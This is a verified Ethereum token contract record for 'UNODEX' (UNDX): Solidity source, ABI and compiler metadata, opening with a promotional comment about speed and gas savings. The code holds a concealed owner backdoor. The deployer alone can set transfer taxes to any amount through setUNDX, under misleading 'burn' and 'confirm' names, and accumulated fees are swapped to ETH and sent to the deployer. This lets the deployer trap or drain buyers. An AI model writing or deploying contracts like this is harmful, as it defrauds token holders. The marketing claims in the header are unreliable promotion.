{"SourceCode": "/*\r\n\r\nUNODEX is a hybrid trading platform (between DEX and CEX) using its own Ethereum NODE and RPC. We can offer transactions up to 25x faster than any other current platform on the market with gas fees reduced by up to 30%.\r\n\r\nThrough its interface, you have access to classic trading functions such as BUY/SELL limit orders, as well as the sniper function, a dedicated dashboard that allows you to track your journey and progress in DeFi, and many more features to come in the upcoming updates.\r\n\r\nOur UNODEX App is live, go try it out on the website.\r\n\r\nTelegram: https://t.me/unodexportal\r\nTwitter: https://twitter.com/unodex_eth\r\nWebsite: https://unodex.site\r\nDocumentation: https://unodex-eth.gitbook.io/unodex-documentation/\r\n\r\n*/\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.23;\r\n\r\n    interface IUniswapV2Router02 {\r\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n            ) external;\r\n        }\r\n        \r\n    contract UNODEX {\r\n        string public constant name = \"UNODEX\";  //\r\n        string public constant symbol = \"UNDX\";  //\r\n        uint8 public constant decimals = 18;\r\n        uint256 public constant totalSupply = 100_000_000 * 10**decimals;\r\n\r\n        uint256 BurnTNumber = 2;\r\n        uint256 ConfirmTNumber = 1;\r\n        uint256 constant swapAmount = totalSupply / 100;\r\n\r\n        mapping (address => uint256) public balanceOf;\r\n        mapping (address => mapping (address => uint256)) public allowance;\r\n            \r\n        error Permissions();\r\n            \r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(\r\n            address indexed owner,\r\n            address indexed spender,\r\n            uint256 value\r\n        );\r\n            \r\n\r\n        address private pair;\r\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n        address payable constant deployer = payable(address(0xa63eA14F0A9bee70021A82f37a0b3B4949235A3c)); //\r\n\r\n        bool private swapping;\r\n        bool private TradingOpenStatus;\r\n\r\n        constructor() {\r\n            balanceOf[msg.sender] = totalSupply;\r\n            allowance[address(this)][routerAddress] = type(uint256).max;\r\n            emit Transfer(address(0), msg.sender, totalSupply);\r\n        }\r\n\r\n         receive() external payable {}\r\n\r\n        function approve(address spender, uint256 amount) external returns (bool){\r\n            allowance[msg.sender][spender] = amount;\r\n            emit Approval(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n\r\n        function transfer(address to, uint256 amount) external returns (bool){\r\n            return _transfer(msg.sender, to, amount);\r\n        }\r\n\r\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n            allowance[from][msg.sender] -= amount;        \r\n            return _transfer(from, to, amount);\r\n        }\r\n\r\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n            require(TradingOpenStatus || from == deployer || to == deployer);\r\n\r\n            if(!TradingOpenStatus && pair == address(0) && amount > 0)\r\n                pair = to;\r\n\r\n            balanceOf[from] -= amount;\r\n\r\n            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n                swapping = true;\r\n                address[] memory path = new  address[](2);\r\n                path[0] = address(this);\r\n                path[1] = ETH;\r\n                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                    );\r\n                deployer.transfer(address(this).balance);\r\n                swapping = false;\r\n                }\r\n\r\n            if(from != address(this)){\r\n                uint256 FinalFigure = amount * (from == pair ? BurnTNumber : ConfirmTNumber) / 100;\r\n                amount -= FinalFigure;\r\n                balanceOf[address(this)] += FinalFigure;\r\n            }\r\n                balanceOf[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n                return true;\r\n            }\r\n\r\n        function OpenTrade() external {\r\n            require(msg.sender == deployer);\r\n            require(!TradingOpenStatus);\r\n            TradingOpenStatus = true;        \r\n            }\r\n            \r\n        function setUNDX(uint256 newTBurn, uint256 newTConfirm) external {\r\n        if(msg.sender == deployer){\r\n            BurnTNumber = newTBurn;\r\n            ConfirmTNumber = newTConfirm;\r\n            }\r\n        else{\r\n            require(newTBurn < 10);\r\n            require(newTConfirm < 10);\r\n            revert();\r\n            }  \r\n        }\r\n        }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"OpenTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newTBurn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newTConfirm\",\"type\":\"uint256\"}],\"name\":\"setUNDX\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "UNODEX", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4486d4cad51048ae7a5c50ade192dcf8fc59ad682898f2552bc0c5ad07057202"}